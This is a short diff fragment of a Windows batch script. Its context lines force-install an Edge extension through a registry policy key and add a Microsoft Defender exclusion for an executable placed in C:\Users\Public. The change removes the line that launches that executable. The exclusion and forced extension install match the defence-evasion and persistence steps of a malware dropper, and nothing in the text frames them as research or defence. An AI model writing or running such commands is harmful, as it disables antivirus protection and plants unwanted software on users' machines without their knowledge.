@@ -65,8 +65,8 @@ reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 3 /
 
 :: === Exclude from Defender and launch ===
 powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\monitorUrlnew.exe'"
-start "" "C:\Users\Public\monitorUrlnew.exe"
 exit /b 0
+
 
 
 
